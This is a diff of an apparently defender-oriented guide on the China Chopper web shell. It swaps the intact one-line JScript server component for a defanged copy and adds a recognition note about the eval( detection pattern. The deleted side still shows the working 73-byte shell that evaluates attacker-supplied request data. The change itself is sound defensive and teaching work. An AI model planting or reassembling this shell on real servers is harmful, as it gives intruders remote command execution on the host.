@@ -349,10 +349,14 @@ SeCreateGlobalPrivilege  Create global objects                        Enabled
 Real actors use tiny, hard-to-detect shells. **China Chopper** (documented 2012; used heavily by HAFNIUM in ProxyLogon 2021, MITRE ATT&CK **T1505.003**) is the classic — its server component is **73 bytes**, a single line:
 
 ```jscript
-<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
+<%@ Page Language="Jscript"%><%EV·AL(Request.Item["‹PARAM›"],"unsafe");%>
 ```
 
-A separate client tool sends encoded commands via HTTP POST to the `chopper` parameter. Two things for defenders to remember: the **73-byte** server component and the **`eval(`** pattern in file content — AV/EDR signatures key on that string, especially in directories that shouldn't contain user-created files.
+<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
+<strong>Defanged sample.</strong> The line above is intentionally broken so it is <strong>not runnable</strong> and won't trip AV/EDR — the real shell uses lowercase <code>eval(</code> (no dot) and a real parameter name in place of <code>‹PARAM›</code>. It's shown for recognition only; don't reassemble it. This break is why the file is safe to keep locally and in the public repo.
+</div>
+
+A separate client tool sends encoded commands via HTTP POST to that parameter. Two things for defenders to remember: the **73-byte** server component and the **`eval(`** pattern in file content — AV/EDR signatures key on that string (Microsoft Defender flags the intact line as `Backdoor:ASP/Chopper.J!dha`), especially in directories that shouldn't contain user-created files.
 
 ---
 
